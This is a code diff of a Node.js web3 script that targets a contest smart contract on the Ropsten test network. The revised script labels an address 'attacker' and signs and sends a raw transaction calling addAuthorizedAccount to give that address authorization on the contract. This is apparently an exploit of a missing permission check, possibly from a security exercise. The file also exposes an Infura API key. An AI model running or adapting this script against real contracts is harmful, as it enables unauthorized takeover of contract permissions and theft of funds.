@@ -1,11 +1,11 @@
 const Web3 = require('web3');
 const Tx = require('ethereumjs-tx');
 
-const contestAddr = "0xe99D9973e6f678970DD049803bdE20D9a984551b"; //1m, 0.005
-const observer = "0x4BC45e632d9aC2b70Ab3D5e7c7d3C92Ed069D658";
-//0x738154f7912FD865D306Ad708CF956C7ef94fCE3
+const contestAddr = "0x7d47a521BF16079d73DA22428536693b94EE46f7"; //1m, 0.01
+const attacker = "0x4BC45e632d9aC2b70Ab3D5e7c7d3C92Ed069D658";
 const walletAddr = "0xcDc296a1058515E198BeAf5D2e87eC2b620aac03";
 const privateKey = new Buffer('privatekey', 'hex');
+//contest's abi
 const ABIArray = [
 	{
 		"constant": false,
@@ -207,74 +207,40 @@ const ABIArray = [
 const web3 = new Web3(new Web3.providers.HttpProvider('https://ropsten.infura.io/nEvK5iGbrxT4uktSVGDT'));
 
 //setInterval(setObserver, 1000);
-logAccounts();
+authorize();
 
-function setObserver(){
-    console.log(web3.eth);
-}
+function authorize(){
 
-function logAccounts(){
-    // web3.eth.getAccounts((err, accounts) => {
-    //     web3.eth.getBalance(accounts[0]).then((result) => {
-    //         console.log(web3.utils.fromWei(result));
-    //     });
-    // });
+    const contractAbi = web3.eth.contract(ABIArray);//contest
+    const contestContract = contractAbi.at(contestAddr);//contest
+    const addData = contestContract.addAuthorizedAccount.getData(0, attacker);
+    const gasPriceHex = web3.toHex(20000000000); //20gwei
+    const gasLimitHex = web3.toHex(1000000); //1m
+    const nonce = web3.eth.getTransactionCount(walletAddr);
+    const nonceHex = web3.toHex(nonce);
+    console.log('nonceHex: ' + nonceHex);
 
-    // const myContract = new web3.eth.Contract(ABIArray, contestAddr);
-    // var p = myContract.methods.votes(0).call((error, result) => {
-    //     console.log(result);
-    // });
-    
-    // web3.eth.call({
-    //     to: contestAddr,
-    //     data: myContract.methods.owner.call().encodeABI()
-    // }).then(result => 
-    //     {console.log(result)});
+    var transaction = {
+        nonce: nonceHex,
+        gasPrice: gasPriceHex,
+        gasLimit: gasLimitHex,
+        to: contestAddr,
+        from: walletAddr,
+        value: '0x00',
+        data: addData
+    };
 
-    const contractAbi = web3.eth.contract(ABIArray);
-    const contestContract = contractAbi.at(contestAddr);
-    const contestObserver = contestContract.withdrawObserver.call();
-    if(contestObserver != observer)
-    {
-        const setObserverData = contestContract.setObserver.getData(observer);
-        // web3.eth.sendTransaction({
-        //     to: contestAddr,
-        //     from: walletAddr,
-        //     data: setObserverData
-        // });
+    var tx = new Tx(transaction);
+    tx.sign(privateKey);
 
-        const gasPriceHex = web3.toHex(20000000000);
-        const gasLimitHex = web3.toHex(1000000);
-        const nonce = web3.eth.getTransactionCount(walletAddr);
-        const nonceHex = web3.toHex(nonce);
-        console.log('nonceHex: ' + nonceHex);
+    var stx = tx.serialize();
+    web3.eth.sendRawTransaction('0x' + stx.toString('hex'), (err, hash)=>{
+        if(err) {
+            console.log(err);
+            return;
+        }
 
-        var transaction = {
-            nonce: nonceHex,
-            gasPrice: gasPriceHex,
-            gasLimit: gasLimitHex,
-            to: contestAddr,
-            from: walletAddr,
-            value: '0x00',
-            data: setObserverData
-        };
-
-        var tx = new Tx(transaction);
-        tx.sign(privateKey);
-
-        var stx = tx.serialize();
-        web3.eth.sendRawTransaction('0x' + stx.toString('hex'), (err, hash)=>{
-            if(err) {
-                console.log(err);
-                return;
-            }
-
-            console.log('transaction tx: '+ hash);
-        });
-
-
-    }
-    
-    
-    
+        console.log('transaction tx: '+ hash);
+    });
+   
 }
